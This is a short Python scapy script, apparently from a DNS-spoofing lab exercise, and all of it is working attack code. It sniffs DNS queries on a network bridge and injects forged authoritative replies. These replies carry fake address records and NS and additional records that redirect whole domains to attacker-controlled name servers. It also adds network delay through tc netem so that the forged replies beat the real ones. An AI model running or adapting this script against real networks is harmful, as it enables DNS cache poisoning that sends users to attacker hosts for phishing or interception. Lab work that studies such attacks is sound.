#!/usr/bin/env python

import os
import sys
from scapy.all import *

def spoof_dns1(pkt):
    if (DNS in pkt and b'www.hust-cse.com' in pkt[DNS].qd.qname):
        # Swap the source and destination IP address
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        # Swap the source and destination port number
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=600, rdata='20.21.9.1')
        # The Authority Section
        NSsec1 = DNSRR(rrname='hust-cse.com', type='NS', ttl=600, rdata='ns.hust-cse.com')
        # The Additional Section
        Addsec1 = DNSRR(rrname='ns.hust-cse.com', type='A', ttl=600, rdata='20.24.4.9')
        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=1, arcount=1, an=Anssec, ns=NSsec1, ar=Addsec1)
        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)

def spoof_dns2(pkt):
    if (DNS in pkt and b'www.example.net' in pkt[DNS].qd.qname):
        # Swap the source and destination IP address
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        # Swap the source and destination port number
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=600, rdata='20.0.6.14')
        # The Authority Section
        NSsec1 = DNSRR(rrname='example.net', type='NS', ttl=600, rdata='attacker32.com')
        # The Additional Section
        Addsec1 = DNSRR(rrname='attacker32.com', type='A', ttl=600, rdata='20.0.8.27')
        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=1, arcount=1, an=Anssec, ns=NSsec1, ar=Addsec1)
        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)


os.system("tc qdisc add dev enp1s0 root netem delay 100ms")
try:
    # Sniff UDP query packets and invoke spoof_dns().
    if (sys.argv[1] == "1"):
        pkt = sniff(filter='udp and dst port 53', prn=spoof_dns1, iface="br-8f1148536672")
    elif (sys.argv[1] == "2"):
        pkt = sniff(filter='src host 10.10.27.2 and udp and dst port 53', prn=spoof_dns2, iface="br-8f1148536672")
except KeyboardInterrupt:
    pass
os.system("tc qdisc del dev enp1s0 root netem delay 100ms") 
